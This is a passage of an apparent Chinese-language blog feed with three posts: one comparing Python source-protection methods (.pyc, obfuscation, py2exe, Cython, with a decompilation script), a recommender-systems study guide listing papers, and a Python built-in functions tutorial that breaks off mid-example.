    <content type="html"><![CDATA[<p>由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。</p><a id="more"></a><p>常见的源码保护手段有如下几种：</p><ol><li><p>发行.pyc文件</p></li><li><p>代码混淆</p></li><li><p>使用py2exe</p></li><li><p>使用Cython</p></li></ol><p>下面来简单说说这些方案。</p><h2 id="1-发行-pyc-文件"><a href="#1-发行-pyc-文件" class="headerlink" title="1.发行.pyc 文件"></a>1.发行.pyc 文件</h2><p><strong>生产.pyc文件</strong>：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m compileall 文件名称</span><br></pre></td></tr></table></figure><p><strong>解密.pyc文件</strong>：</p><p>首先安装<strong>uncompyle6</strong> 库，然后在同文件下执行：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o . 文件名</span><br></pre></td></tr></table></figure><p><strong>批量解密.pyc文件</strong>：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># encoding=utf8</span></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> uncompyle6</span><br><span class="line"><span class="hljs-keyword">from</span> uncompyle6 <span class="hljs-keyword">import</span> decompile_file</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    path = <span class="hljs-string">'C:\filename'</span>.decode(<span class="hljs-string">'utf8'</span>)        <span class="hljs-comment"># Windows下</span></span><br><span class="line">    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):</span><br><span class="line">        <span class="hljs-keyword">if</span> root != path:</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> files:</span><br><span class="line">            <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'pyc'</span>):</span><br><span class="line">                <span class="hljs-keyword">print</span> filename</span><br><span class="line">                os.system(<span class="hljs-string">'uncompyle6 -o . %s'</span>%filename)</span><br><span class="line">    </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>优点：</p><ul><li><p>简单方便，提高了一点源码破解门槛</p></li><li><p>平台兼容性好，.py能在哪里运行，.pyc就能在哪里运行</p></li></ul><p>不足：</p><ul><li><p>解释器兼容性差，.pyc只能在特定版本的解释器上运行</p></li><li><p>有现成的反编译工具，破解成本低</p></li></ul><h2 id="2-代码混淆"><a href="#2-代码混淆" class="headerlink" title="2.代码混淆"></a>2.代码混淆</h2><ul><li><p>网站混淆：<a href="http://pyob.oxyry.com/" target="_blank" rel="noopener">http://pyob.oxyry.com/</a></p></li><li><p>使用 pyobfuscate 库进行混淆</p></li></ul><p>优点：</p><ul><li>简单方便，提高了一点源码破解门槛</li><li>兼容性好，只要源码逻辑能做到兼容，混淆代码亦能</li></ul><p>不足：</p><ul><li>只能对单个文件混淆，无法做到多个互相有联系的源码文件的联动混淆</li><li>代码结构未发生变化，也能获取字节码，破解难度不大</li></ul><h2 id="3-使用py2exe"><a href="#3-使用py2exe" class="headerlink" title="3.使用py2exe"></a>3.使用py2exe</h2><p>py2exe 是一款将 Python 脚本转换为 Windows 平台上的可执行文件的工具。其原理是将源码编译为.pyc文件，加之必要的依赖文件，一起打包成一个可执行文件。</p><p>使用py2exe进行打包的步骤较为简便。</p><p>1）编写入口文件。本示例中取名为hello.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print 'Hello World'</span><br></pre></td></tr></table></figure><p>2）编写setup.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line"></span><br><span class="line">setup(console=['hello.py'])</span><br></pre></td></tr></table></figure><p>3）生成可执行文件</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py py2exe</span><br></pre></td></tr></table></figure><p>生成的可执行文件位于dist\hello.exe</p><p>优点：</p><ul><li><p>能够直接打包成 exe，方便分发和执行</p></li><li><p>破解门槛比 .pyc 更高一些</p></li></ul><p>不足：</p><ul><li><p>兼容性差，只能运行在 Windows 系统上</p></li><li><p>生成的可执行文件内的布局是明确、公开的，可以找到源码对应的.pyc文件，进而反编译出源码</p></li></ul><h2 id="4-使用-Cython"><a href="#4-使用-Cython" class="headerlink" title="4.使用 Cython"></a>4.使用 Cython</h2><p>使用Cython进行开发的步骤也不复杂。</p><p>1）编写文件hello.pyx或hello.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello():</span><br><span class="line">    print('hello')</span><br></pre></td></tr></table></figure><p>2）编写setup.py：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">from Cython.Build import cythonize</span><br><span class="line"></span><br><span class="line">setup(name='Hello World app',</span><br><span class="line">     ext_modules=cythonize('hello.pyx'))</span><br></pre></td></tr></table></figure><p>3）编译为.c，再进一步编译为.so或.pyd：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py build_ext --inplace</span><br></pre></td></tr></table></figure><p>执行python -c “from hello import hello;hello()”即可直接引用生成的二进制文件中的hello()函数。</p><p>优点：</p><ul><li><p>生成的二进制 .so 或 .pyd 文件难以破解</p></li><li><p>同时带来了性能提升</p></li></ul><p>不足：</p><ul><li><p>兼容性稍差，对于不同版本的操作系统，可能需要重新编译</p></li><li><p>虽然支持大多数 Python 代码，但如果一旦发现部分代码不支持，完善成本较高</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="代码加密" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>[转]推荐系统入门经验</title>
    <link href="http://yoursite.com/2019/11/05/%E8%BD%AC-%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8%E7%BB%8F%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/11/05/转-推荐系统入门经验/</id>
    <published>2019-11-05T13:46:55.000Z</published>
    <updated>2019-11-05T14:01:24.746Z</updated>
    
    <content type="html"><![CDATA[<p>自学推荐系统两年多了，也阅读了一些相关的书籍和论文，但毕竟还没有实际的在公司做过推荐相关项目，所以说跟大佬们相比，还是有很多差距的。不过，在入门推荐的道路上，有一些经验和资料还是可以分享给你的，希望本文能够对你有所帮助。</p><a id="more"></a><h1 id="1、第一阶段-掌握机器学习基础知识，打好基础"><a href="#1、第一阶段-掌握机器学习基础知识，打好基础" class="headerlink" title="1、第一阶段 - 掌握机器学习基础知识，打好基础"></a>1、第一阶段 - 掌握机器学习基础知识，打好基础</h1><p>学习推荐系统，还是要掌握一定的机器学习知识的，从特征获取、特征处理、特征选择，到基本的机器学习模型如逻辑回归、GBDT等等，都需要你熟练掌握。</p><p>其中比较重要的就是特征这块，因为推荐系统中会面临大量的离散特征，对离散特征的处理方式需要有一定的了解。</p><p>这里还是推荐李航博士的《统计学习方法第二版》。</p><p>然后就是神经网络，推荐系统中神经网络运用非常多，神经网络中基础的如循环神经网络、卷积神经网络，以及一些模型结构的搭建、训练的技巧如Dropout、BN等等也需要有所理解。</p><p>这个推荐吴恩达的深度学习课程以及李宏毅老师的深度学习课程。</p><h1 id="2、第二阶段-阅读推荐系统经典书籍，入门推荐"><a href="#2、第二阶段-阅读推荐系统经典书籍，入门推荐" class="headerlink" title="2、第二阶段 - 阅读推荐系统经典书籍，入门推荐"></a>2、第二阶段 - 阅读推荐系统经典书籍，入门推荐</h1><p>推荐系统市面上的书不是很多，而且写得往往不够深入，仅能够起到一定的入门作用，毕竟推荐在各个公司还是比较核心的内容，是比较受到保护的。但经典的书籍还是有的，入门的话推荐两本。</p><p>一是大家所熟知的《推荐系统实践》，这本的话对于大家了解推荐系统中最基本的算法如协同过滤、推荐系统中常用的评价指标、使用上下文和社交网络进行推荐、如何解决冷启动问题都有一定的帮助。</p><p>二是最近市面上新出现的《推荐系统开发实战》一书，虽然这本书我还没有看过，但不少的群友反映这本书对于入门推荐系统来说十分友好。理论和实战相结合，是挺不错的一本“小白实操书”。</p><p><a href="https://imgchr.com/i/M9YoRJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/05/M9YoRJ.md.jpg" alt="M9YoRJ.jpg" border="0"></a></p><p>然后还有的一些书籍如《推荐系统与深度学习》和《推荐系统-技术、评估及高效算法》，大家感兴趣的话也可以进行阅读。</p><h1 id="3、第三阶段-精读推荐系统经典论文，掌握诀窍"><a href="#3、第三阶段-精读推荐系统经典论文，掌握诀窍" class="headerlink" title="3、第三阶段 - 精读推荐系统经典论文，掌握诀窍"></a>3、第三阶段 - 精读推荐系统经典论文，掌握诀窍</h1><p>在理解基本的推荐知识之后，你大概会了解到推荐具体是做什么的，那么其问题又可以分成几个方面。如召回、CTR预估、Learning to Rank等等。这个时候我建议的话就是开始阅读经典论文了。下面整理一些我看过的比较经典的论文吧，可能有遗漏，也欢迎大家补充。</p><p>FM：《Factorization Machines》</p><p>FFM：《Field-aware Factorization Machines for CTR Prediction》</p><p>DeepFM：《DeepFM: A Factorization-Machine based Neural Network for CTR Prediction》</p><p>Wide &amp; Deep：《Wide &amp; Deep Learning for Recommender Systems》</p><p>DCN：《Deep &amp; Cross Network for Ad Click Predictions》</p><p>NFM：《Neural Factorization Machines for Sparse Predictive Analytics》</p><p>AFM：《Attentional Factorization Machines:Learning the Weight of Feature Interactions via Attention Networks》</p><p>GBDT + LR：《Practical Lessons from Predicting Clicks on Ads at Facebook》</p><p>MLR：《Learning Piece-wise Linear Models from Large Scale Data for Ad Click Prediction》</p><p>DIN：《Deep Interest Network for Click-Through Rate Prediction》</p><p>DIEN：《Deep Interest Evolution Network for Click-Through Rate Prediction》</p><p>BPR：《BPR: Bayesian Personalized Ranking from Implicit Feedback》</p><p>Youtube：《Deep Neural Networks for YouTube Recommendations》</p><p>当然有些其他的论文也十分经典，咱们放在后面继续讲。</p><p>读论文也是需要一定的技巧，不同的人可能关注的点不一样，所以导致阅读重心不一样。对于我来说，我比较关注的点是这个论文要解决什么样的问题，是如何解决的，以及作者从哪几方面出发，使用什么评价指标来评判模型的好坏。至于效果，论文嘛，可信可不信，看看就好了。</p><h1 id="4、第四阶段-复现推荐论文开源代码，加深理解"><a href="#4、第四阶段-复现推荐论文开源代码，加深理解" class="headerlink" title="4、第四阶段 - 复现推荐论文开源代码，加深理解"></a>4、第四阶段 - 复现推荐论文开源代码，加深理解</h1><p>读论文中你也许会有很多疑惑，如DeepFM这个Embedding如何共享的？DIN里面的Attention如何实现？解决这些疑惑的最好办法我认为不是读论文、百度别人写的博客，最好的方法就是去找开源的代码，试着复现也好，比着代码自己实现一遍也好，对你加深认识都有很大的帮助！</p><p>有一些开源的代码我已经帮大家整理的差不多了，在下面的github中（以后不要再问我数据或者地址的问题了，数据都在github的readme中）：<a href="https://github.com/princewen/tensorflow_practice" target="_blank" rel="noopener">https://github.com/princewen/tensorflow_practice</a></p><p>不管对一篇论文你看懂了还是没看懂也好，都去尝试复现一遍吧，真的很有帮助。</p><h1 id="5、第五阶段-持续跟进最近推荐论文，思维发散"><a href="#5、第五阶段-持续跟进最近推荐论文，思维发散" class="headerlink" title="5、第五阶段 - 持续跟进最近推荐论文，思维发散"></a>5、第五阶段 - 持续跟进最近推荐论文，思维发散</h1><p>在不断跟进推荐系统论文的过程中，你会发现推荐系统会借鉴各个领域的方法， 持续跟进最近推荐论文，对我们学习其他领域如NLP、图像领域、强化学习等等都会有所帮助。接下来列举一些借鉴其他领域方法的一些文章吧，也算是对第三部分的一个补充。</p><p><strong>强化学习</strong></p><p>《DRN: A Deep Reinforcement Learning Framework for News Recommendation》</p><p>《Deep Reinforcement Learning for List-wise Recommendations》</p><p><strong>多任务学习</strong></p><p>《Entire Space Multi-Task Model: An Effective Approach for Estimating Post-Click Conversion Rate》</p><p>《Why I like it: Multi-task Learning for Recommendation and Explanation》</p><p><strong>GAN</strong></p><p>《IRGAN: A Minimax Game for Unifying Generative and Discriminative Information Retrieval Models》</p><p>《CFGAN: A Generic Collaborative Filtering Framework based on Generative Adversarial Networks》</p><p><strong>知识图谱</strong></p><p>《DKN: Deep Knowledge-Aware Network for News Recommendation》</p><p>《RippleNet: Propagating User Preferences on the Knowledge Graph for Recommender Systems》</p><p>《Multi-task Learning for KG enhanced Recommendation》</p><p>《Perceive Your Users in Depth: Learning Universal User Representations from Multiple E-commerce Tasks》</p><p><strong>Transformer</strong></p><p>《Next Item Recommendation with Self-Attention》</p><p>《Deep Session Interest Network for Click-Through Rate Prediction》</p><p>《Behavior Sequence Transformer for E-commerce Recommendation in Alibaba》</p><p>《BERT4Rec: Sequential Recommendation with Bidirectional Encoder Representations from Transformer》</p><p><strong>RNN &amp; GNN</strong></p><p>《SESSION-BASED RECOMMENDATIONS WITH RECURRENT NEURAL NETWORKS》</p><p>《Improved Recurrent Neural Networks for Session-based Recommendations》</p><p>《Session-based Recommendation with Graph Neural Networks》</p><p><strong>Embedding技巧</strong></p><p>《Real-time Personalization using Embeddings for Search Ranking at Airbnb》</p><p>《Learning and Transferring IDs Representation in E-commerce》</p><p>《Billion-scale Commodity Embedding for E-commerce Recommendation in Alibaba》</p><p><strong>福粒:</strong></p><ol><li><p><a href="http://pan.sqdxwz.com/?/文档/" target="_blank" rel="noopener">论文下载</a></p></li><li><p>微信搜索：小小挖掘机</p></li></ol><img src="https://s2.ax1x.com/2019/11/05/M9NpkT.jpg" alt="M9NpkT.jpg" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自学推荐系统两年多了，也阅读了一些相关的书籍和论文，但毕竟还没有实际的在公司做过推荐相关项目，所以说跟大佬们相比，还是有很多差距的。不过，在入门推荐的道路上，有一些经验和资料还是可以分享给你的，希望本文能够对你有所帮助。&lt;/p&gt;
    
    </summary>
    
    
      <category term="推荐系统" scheme="http://yoursite.com/categories/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="入门" scheme="http://yoursite.com/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>python 63个内置函数</title>
    <link href="http://yoursite.com/2019/11/03/python-63%E4%B8%AA%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2019/11/03/python-63个内置函数/</id>
    <published>2019-11-03T07:37:21.000Z</published>
    <updated>2019-11-03T07:52:40.107Z</updated>
    
    <content type="html"><![CDATA[<p>1 abs()</p><p>绝对值或复数的模</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">1</span>]: abs(<span class="hljs-number">-6</span>)</span><br><span class="line">Out[<span class="hljs-number">1</span>]: <span class="hljs-number">6</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>2 all()　<br>　<br>接受一个迭代器，如果迭代器的所有元素都为真，那么返回True，否则返回False</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">2</span>]: all([<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>])</span><br><span class="line">Out[<span class="hljs-number">2</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">3</span>]: all([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])</span><br><span class="line">Out[<span class="hljs-number">3</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>3 any()　　</p><p>接受一个迭代器，如果迭代器里有一个元素为真，那么返回True，否则返回False</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">4</span>]: any([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,[]])</span><br><span class="line">Out[<span class="hljs-number">4</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">5</span>]: any([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])</span><br><span class="line">Out[<span class="hljs-number">5</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>4 ascii()　<br>　<br>调用对象的repr() 方法，获得该方法的返回值</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">30</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:         self.id = id</span><br><span class="line">    ...:         self.name = name</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">33</span>]: print(xiaoming)</span><br><span class="line">id = <span class="hljs-number">001</span>, name = xiaoming</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">34</span>]: ascii(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">34</span>]: <span class="hljs-string">'id = 001, name = xiaoming'</span></span><br></pre></td></tr></table></figure><p>5  bin()</p><p>将十进制转换为二进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">35</span>]: bin(<span class="hljs-number">10</span>)</span><br><span class="line">Out[<span class="hljs-number">35</span>]: <span class="hljs-string">'0b1010'</span></span><br></pre></td></tr></table></figure><p>6 oct()</p><p>将十进制转换为八进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">36</span>]: oct(<span class="hljs-number">9</span>)</span><br><span class="line">Out[<span class="hljs-number">36</span>]: <span class="hljs-string">'0o11'</span></span><br></pre></td></tr></table></figure><p>7 hex()</p><p>将十进制转换为十六进制</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">37</span>]: hex(<span class="hljs-number">15</span>)</span><br><span class="line">Out[<span class="hljs-number">37</span>]: <span class="hljs-string">'0xf'</span></span><br></pre></td></tr></table></figure><p>8 bool()　<br>　<br>测试一个对象是True, 还是False.</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">38</span>]: bool([<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])</span><br><span class="line">Out[<span class="hljs-number">38</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">39</span>]: bool([])</span><br><span class="line">Out[<span class="hljs-number">39</span>]: <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">40</span>]: bool([<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>])</span><br><span class="line">Out[<span class="hljs-number">40</span>]: <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure><p>9 bytes()　　</p><p>将一个字符串转换成字节类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">44</span>]: s = <span class="hljs-string">"apple"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">45</span>]: bytes(s,encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">Out[<span class="hljs-number">45</span>]: <span class="hljs-string">b'apple'</span></span><br></pre></td></tr></table></figure><p>10 str()　　</p><p>将字符类型、数值类型等转换为字符串类型</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">46</span>]: integ = <span class="hljs-number">100</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">47</span>]: str(integ)</span><br><span class="line">Out[<span class="hljs-number">47</span>]: <span class="hljs-string">'100'</span></span><br></pre></td></tr></table></figure><p>11 callable()　　</p><p>判断对象是否可以被调用，能被调用的对象就是一个callable 对象，比如函数 str, int 等都是可被调用的，但是例子4 中xiaoming这个实例是不可被调用的：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">48</span>]: callable(str)</span><br><span class="line">Out[<span class="hljs-number">48</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">49</span>]: callable(int)</span><br><span class="line">Out[<span class="hljs-number">49</span>]: <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">50</span>]: xiaoming</span><br><span class="line">Out[<span class="hljs-number">50</span>]: id = <span class="hljs-number">001</span>, name = xiaoming</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">51</span>]: callable(xiaoming)</span><br><span class="line">Out[<span class="hljs-number">51</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>12 chr()</p><p>查看十进制整数对应的ASCII字符</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">54</span>]: chr(<span class="hljs-number">65</span>)</span><br><span class="line">Out[<span class="hljs-number">54</span>]: <span class="hljs-string">'A'</span></span><br></pre></td></tr></table></figure><p>13 ord()</p><p>查看某个ascii对应的十进制数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">60</span>]: ord(<span class="hljs-string">'A'</span>)</span><br><span class="line">Out[<span class="hljs-number">60</span>]: <span class="hljs-number">65</span></span><br></pre></td></tr></table></figure><p>14 classmethod()　<br>　<br>classmethod 修饰符对应的函数不需要实例化，不需要 self 参数，但第一个参数需要是表示自身类的 cls 参数，可以来调用类的属性，类的方法，实例化对象等。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">66</span>]: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,id,name)</span>:</span></span><br><span class="line">    ...:         self.id = id</span><br><span class="line">    ...:         self.name = name</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">    ...:         <span class="hljs-keyword">return</span> <span class="hljs-string">'id = '</span>+self.id +<span class="hljs-string">', name = '</span>+self.name</span><br><span class="line">    ...:     @classmethod</span><br><span class="line">    ...:     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span><span class="hljs-params">(cls)</span>:</span></span><br><span class="line">    ...:         print(cls)</span><br></pre></td></tr></table></figure><p>15 complie()　　</p><p>将字符串编译成python 能识别或可以执行的代码，也可以将文字读成字符串再编译。</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">74</span>]: s  = <span class="hljs-string">"print('helloworld')"</span></span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">75</span>]: r = compile(s,<span class="hljs-string">"&lt;string&gt;"</span>, <span class="hljs-string">"exec"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">76</span>]: r</span><br><span class="line">Out[<span class="hljs-number">76</span>]: &lt;code object &lt;module&gt; at <span class="hljs-number">0x0000000005DE75D0</span>, file <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">77</span>]: exec(r)</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure><p>16  complex()</p><p>创建一个复数</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">81</span>]: complex(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br><span class="line">Out[<span class="hljs-number">81</span>]: (<span class="hljs-number">1</span>+<span class="hljs-number">2j</span>)</span><br></pre></td></tr></table></figure><p>17 delattr()　<br>　<br>删除对象的属性</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">87</span>]: delattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">88</span>]: hasattr(xiaoming,<span class="hljs-string">'id'</span>)</span><br><span class="line">Out[<span class="hljs-number">88</span>]: <span class="hljs-literal">False</span></span><br></pre></td></tr></table></figure><p>18 dict()　<br>　<br>创建数据字典</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="hljs-number">92</span>]: dict()</span><br><span class="line">Out[<span class="hljs-number">92</span>]: &#123;&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">93</span>]: dict(a=<span class="hljs-string">'a'</span>,b=<span class="hljs-string">'b'</span>)</span><br><span class="line">Out[<span class="hljs-number">93</span>]: &#123;<span class="hljs-string">'a'</span>: <span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>: <span class="hljs-string">'b'</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="hljs-number">94</span>]: dict(zip([<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>],[<span class="hljs-number">1</span>,<span 